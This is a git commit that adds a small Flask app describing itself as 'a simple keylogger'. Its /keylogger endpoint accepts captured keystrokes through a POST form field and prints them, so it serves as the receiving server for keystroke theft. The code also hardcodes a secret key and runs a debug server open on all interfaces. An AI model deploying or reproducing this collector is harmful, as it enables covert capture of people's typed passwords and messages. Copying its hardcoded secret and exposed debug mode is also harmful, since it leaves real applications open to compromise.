ceb83ba0c8f71bdba3d166df12cab192c6b818d6
david <david@davids-mbp.mynetworksettings.com>
2023-09-07 10:52:45 -0400

    initial commit

---
+++ app.py
@@ -0,0 +1,26 @@
+
+# from flask import Flask, render_template, url_for, flash, redirect
+from flask import Flask, render_template, url_for, flash, redirect, request
+from flask_behind_proxy import FlaskBehindProxy
+app = Flask(__name__)
+proxied = FlaskBehindProxy(app)
+app.config['SECRET_KEY'] = 'c29bcfa698752666def85f68880d22d8'
+
+
+@app.route("/")
+def home():
+    return "I'm a simple keylogger"
+
+@app.route("/test")
+def test():
+    return render_template('home.html', subtitle='Home Page', text='This is the home page')
+
+@app.route("/keylogger", methods=['POST'])
+def keylogger():
+    keylog = request.form.get('keylog')
+
+    print("keylog: ",keylog)
+    return '', 204
+
+if __name__ == '__main__':
+    app.run(debug=True, host="0.0.0.0")
